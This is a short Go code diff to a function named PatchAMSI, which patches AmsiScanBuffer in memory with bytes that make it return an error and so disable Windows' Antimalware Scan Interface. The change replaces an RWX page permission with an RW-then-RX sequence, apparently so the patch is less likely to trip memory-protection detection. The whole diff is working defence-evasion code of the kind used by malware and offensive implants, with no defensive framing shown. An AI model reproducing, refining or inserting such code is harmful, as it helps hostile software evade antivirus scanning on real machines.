@@ -29,11 +29,11 @@ func PatchAMSI() error {
 		return fmt.Errorf("resolve AmsiScanBuffer: %w", err)
 	}
 
-	// Change page protection to RWX
+	// Step 1: Change page protection to RW (writable, not executable)
 	var oldProtect uint32
-	err = windows.VirtualProtect(scanBuf, 6, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
+	err = windows.VirtualProtect(scanBuf, 6, windows.PAGE_READWRITE, &oldProtect)
 	if err != nil {
-		return fmt.Errorf("VirtualProtect RWX: %w", err)
+		return fmt.Errorf("VirtualProtect RW: %w", err)
 	}
 
 	// Write patch: mov eax, 0x80070057 / ret
@@ -45,8 +45,11 @@ func PatchAMSI() error {
 	patch[4] = 0x80
 	patch[5] = 0xC3 // ret
 
-	// Restore original protection
-	_ = windows.VirtualProtect(scanBuf, 6, oldProtect, &oldProtect)
+	// Step 2: Flip to RX (executable, non-writable) — page is never RWX
+	err = windows.VirtualProtect(scanBuf, 6, windows.PAGE_EXECUTE_READ, &oldProtect)
+	if err != nil {
+		return fmt.Errorf("VirtualProtect RW→RX: %w", err)
+	}
 
 	return nil
 }
